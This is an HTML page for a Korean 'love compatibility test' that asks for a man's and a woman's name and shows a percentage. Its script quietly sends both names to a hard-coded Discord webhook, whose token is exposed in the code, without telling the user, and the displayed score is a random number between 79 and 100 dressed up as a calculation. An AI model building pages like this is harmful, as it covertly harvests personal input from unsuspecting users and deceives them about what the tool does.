<!DOCTYPE html>
<html lang="en">
<head>
    <meta property="og:url" content="https://isongunah1212.github.io/lovetest/">
    <meta property="og:title" content="궁합테스트">
    <meta property="og:type" content="website">
    <meta property="og:image" content="https://cdn.pixabay.com/photo/2016/04/24/05/52/heart-1348868_640.png">
    <meta property="og:description" content="한번에 보는 궁합테스트">
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>궁합 테스트</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f4f4f4;
            margin: 0;
            padding: 0;
        }
        .container {
            width: 450px;
            margin: 50px auto;
            padding: 20px;
            border-radius: 10px;
            background-color: #fff;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
        }
        h2 {
            margin-top: 0;
            color: #333;
            font-weight: 500;
        }
        .input-group {
            margin-bottom: 15px;
        }
        .input-group label {
            display: block;
            margin-bottom: 5px;
            color: #666;
            font-weight: 600;
        }
        .input-group input {
            width: calc(100% - 10px);
            height: 40px;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 5px;
            font-size: 16px;
            transition: border-color 0.3s;
        }
        .input-group input:focus {
            outline: none;
            border-color: #007bff;
        }
        button {
            width: 100%;
            padding: 12px 0;
            background-color: #007bff;
            color: #fff;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        button:hover {
            background-color: #0056b3;
        }
        #result {
            display: none; /* 결과를 초기에는 숨깁니다. */
            margin-top: 20px; /* 결과와 버튼 사이의 간격을 설정합니다. */
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 5px;
            background-color: #f9f9f9;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>궁합 테스트♥</h2>
        <div class="input-group">
            <label for="name1">남자:</label>
            <input type="text" id="name1">
        </div>
        <div class="input-group">
            <label for="name2">여자:</label>
            <input type="text" id="name2">
        </div>
        <button onclick="sendMessage()">궁합 확인</button>
        <!-- 결과를 표시할 div -->
        <div id="result"></div>
    </div>

    <script>
        function sendMessage() {
            var name1 = document.getElementById("name1").value;
            var name2 = document.getElementById("name2").value;
            var inputText = name1 + ", " + name2;
            // 여기서 디스코드 웹훅 URL을 수정하세요.
            var discordWebhookURL = "https://discord.com/api/webhooks/1221117676206952449/SYa8cjd6H0T9s5m9yU-hDczHc5g5MQITv29m3w2vwhDNZhPEFMvpCZTHtGhFCYG-9uyF";

            var xhr = new XMLHttpRequest();
            xhr.open("POST", discordWebhookURL);
            xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");

            // 결과 값을 생성합니다.
            var result = Math.floor(Math.random() * (100 - 79 + 1)) + 79;

            var payload = {
                content: inputText + "의 궁합 결과: 계산중..." // 결과 값을 메시지에 포함시킵니다.
            };

            xhr.send(JSON.stringify(payload));

            // 결과를 표시할 div에 결과를 추가합니다.
            var resultDiv = document.getElementById("result");
            resultDiv.style.display = "block"; // 결과를 표시합니다.
            resultDiv.innerHTML = "궁합 결과: 계산중..."; // "계산중..."으로 설정합니다.

            // 1초 후에 결과를 설정합니다.
            setTimeout(function() {
                resultDiv.innerHTML = "궁합 결과: " + result + "%";
            }, 1000);
        }
    </script>
</body>
</html>
